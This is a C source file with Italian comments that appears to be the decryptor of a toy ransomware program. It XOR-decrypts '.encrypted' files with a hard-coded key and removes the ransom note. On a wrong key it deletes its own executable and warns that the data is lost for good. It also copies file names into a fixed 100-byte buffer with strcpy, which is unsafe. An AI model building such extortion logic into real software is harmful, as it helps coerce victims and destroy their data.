#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>

int main()
{

    int chiave;
    printf("inserisci la chiave di decriptazione: \n");
    scanf("%d", &chiave);

    if (chiave == 123)
    {
        DIR *d;
        struct dirent *dir;
        d = opendir(".");

        if (d)
        {
            while ((dir = readdir(d)) != NULL)
            {
                char *ext = strrchr(dir->d_name, '.');
                if (ext != NULL && strcmp(ext, ".encrypted") == 0)
                {
                    FILE *fileCifrato, *fileDecifrato;

                    // Funzione di decifratura
                    fileCifrato = fopen(dir->d_name, "rb");
                    if (fileCifrato == NULL)
                    {
                        perror("Errore nell'apertura del file cifrato");
                        return EXIT_FAILURE;
                    }

                    char nomeFileDecifrato[100];
                    strcpy(nomeFileDecifrato, dir->d_name);
                    char *posiz = strstr(nomeFileDecifrato, ".encrypted");
                    if (posiz != NULL)
                    {
                        strcpy(posiz, posiz + strlen(".encrypted"));
                    }

                    fileDecifrato = fopen(nomeFileDecifrato, "wb");
                    if (fileDecifrato == NULL)
                    {
                        perror("Errore nella creazione del file decifrato");
                        fclose(fileCifrato);
                        return EXIT_FAILURE;
                    }

                    int byte, byteDecifrato;
                    while ((byte = fgetc(fileCifrato)) != EOF)
                    {
                        byteDecifrato = byte ^ chiave;       // Operazione XOR per la decifratura
                        fputc(byteDecifrato, fileDecifrato); // Scrittura del byte decifrato nel file decifrato
                    }

                    // Chiusura dei file
                    fclose(fileCifrato);
                    fclose(fileDecifrato);

                    // Rimozione del file cifrato
                    if (remove(dir->d_name) != 0)
                    {
                        perror("Errore nella rimozione del file cifrato");
                        return EXIT_FAILURE;
                    }
                }
            }
        }
        closedir(d);
        remove("READ ME.txt"); //rimuovo il file READ ME
        printf("Decifratura completata e file cifrati rimossi.\n");
        return EXIT_SUCCESS;
    }
    else //se la chiave non è corretta elimina il file di decriptazione
    {
        char *file = "Prog_2";
        if (remove(file) == 0)
            printf("La chiave che hai inserito non è corretta. il file eseguibile è stato eliminato, non avrai più i tuoi dati indietro.\n");
        else
            printf("file non rimosso\n");
    }
}